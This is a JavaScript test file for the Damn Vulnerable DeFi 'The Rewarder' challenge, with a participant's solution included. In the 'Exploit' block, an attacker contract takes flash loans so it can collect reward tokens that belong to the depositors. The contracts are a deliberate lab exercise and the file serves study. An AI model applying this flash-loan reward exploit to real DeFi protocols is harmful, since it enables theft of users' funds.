const { ether, time } = require("@openzeppelin/test-helpers");
const { accounts, contract } = require("@openzeppelin/test-environment");

const FlashLoanerPool = contract.fromArtifact("FlashLoanerPool");
const TheRewarderPool = contract.fromArtifact("TheRewarderPool");
const DamnValuableToken = contract.fromArtifact("DamnValuableToken");
const RewardToken = contract.fromArtifact("RewardToken");
const AccountingToken = contract.fromArtifact("AccountingToken");
const ExploitRewarder = contract.fromArtifact("ExploitRewarder");

const { expect } = require("chai");

describe("[Challenge] The rewarder", function () {
  const [deployer, alice, bob, charlie, david, attacker, ...otherAccounts] =
    accounts;
  const users = [alice, bob, charlie, david];
  let exploit;

  const TOKENS_IN_LENDER_POOL = ether("1000000");

  before(async function () {
    /** SETUP SCENARIO */
    this.liquidityToken = await DamnValuableToken.new({ from: deployer });
    this.flashLoanPool = await FlashLoanerPool.new(
      this.liquidityToken.address,
      { from: deployer }
    );

    // Set initial token balance of the pool offering flash loans
    await this.liquidityToken.transfer(
      this.flashLoanPool.address,
      TOKENS_IN_LENDER_POOL,
      { from: deployer }
    );

    this.rewarderPool = await TheRewarderPool.new(this.liquidityToken.address, {
      from: deployer,
    });
    this.rewardToken = await RewardToken.at(
      await this.rewarderPool.rewardToken()
    );
    this.accountingToken = await AccountingToken.at(
      await this.rewarderPool.accToken()
    );

    // Alice, Bob, Charlie and David deposit 100 tokens each
    for (let i = 0; i < users.length; i++) {
      const amount = ether("100");
      await this.liquidityToken.transfer(users[i], amount, { from: deployer });
      await this.liquidityToken.approve(this.rewarderPool.address, amount, {
        from: users[i],
      });
      await this.rewarderPool.deposit(amount, { from: users[i] });
      expect(await this.accountingToken.balanceOf(users[i])).to.be.bignumber.eq(
        amount
      );
    }

    expect(await this.accountingToken.totalSupply()).to.be.bignumber.eq(
      ether("400")
    );
    expect(await this.rewardToken.totalSupply()).to.be.bignumber.eq("0");

    // Advance time 5 days so that depositors can get rewards
    await time.increase(time.duration.days(5));

    // Each depositor gets 25 reward tokens
    for (let i = 0; i < users.length; i++) {
      await this.rewarderPool.distributeRewards({ from: users[i] });
      expect(await this.rewardToken.balanceOf(users[i])).to.be.bignumber.eq(
        ether("25")
      );
    }
    expect(await this.rewardToken.totalSupply()).to.be.bignumber.eq(
      ether("100")
    );

    // Two rounds should have occurred so far
    expect(await this.rewarderPool.roundNumber()).to.be.bignumber.eq("2");
  });

  it("Exploit", async function () {
    /** YOUR EXPLOIT GOES HERE */

    exploit = await ExploitRewarder.new(
      this.flashLoanPool.address,
      this.rewarderPool.address,
      this.liquidityToken.address,
      this.rewardToken.address,
      { from: deployer }
    );
    const rewarderPoolbalanceBefore = await this.rewardToken.balanceOf(
      this.rewarderPool.address
    );
    console.log(
      `rewarderPoolbalanceBefore: ${rewarderPoolbalanceBefore.toString()}`
    );
    const accountingTokenSupplyBefore =
      await this.accountingToken.totalSupplyAt("2");
    console.log(
      `accountingTokenSupplyBefore: ${accountingTokenSupplyBefore.toString()}`
    );
    const liquidityTokenBalanceBefore = await this.liquidityToken.balanceOf(
      this.flashLoanPool.address
    );
    console.log(
      `liquidityTokenBalanceBefore: ${liquidityTokenBalanceBefore.toString()}`
    );

    const exploitBalanceBefore = await exploit.poolBal();
    console.log(`exploitBalanceBefore: ${exploitBalanceBefore.toString()}`);
    const rewardTokenBalanceBefore = await this.rewardToken.balanceOf(
      exploit.address
    );
    console.log(
      `rewardTokenBalanceBefore: ${rewardTokenBalanceBefore.toString()}`
    );
    await exploit.callFlashLoan({ from: attacker });

    const liqbalaBefore = await this.liquidityToken.balanceOf(exploit.address);
    console.log("liqbalaBefore; ", liqbalaBefore.toString());

    const liquidityTokenBalanceAfter = await this.liquidityToken.balanceOf(
      this.flashLoanPool.address
    );
    console.log(
      `liquidityTokenBalanceAfter: ${liquidityTokenBalanceAfter.toString()}`
    );

    const accrued = await exploit.accrued();
    console.log(`exploit accrued: ${accrued.toString()}`);
    const accountingTokenSupplyAfter = await this.accountingToken.totalSupplyAt(
      "2"
    );
    console.log(
      `accountingTokenSupplyAfter: ${accountingTokenSupplyAfter.toString()}`
    );

    await time.increase(time.duration.days(5));
    await exploit.callFlashLoan({ from: attacker });
  });

  after(async function () {
    // Only one round should have taken place
    expect(await this.rewarderPool.roundNumber()).to.be.bignumber.eq("3");

    // Users should not get more rewards this round
    for (let i = 0; i < users.length; i++) {
      await this.rewarderPool.distributeRewards({ from: users[i] });
      expect(await this.rewardToken.balanceOf(users[i])).to.be.bignumber.eq(
        ether("25")
      );
    }

    // Rewards must have been issued to the attacker account
    expect(await this.rewardToken.totalSupply()).to.be.bignumber.gt(
      ether("100")
    );
    expect(await this.rewardToken.balanceOf(attacker)).to.be.bignumber.gt("0");
  });
});
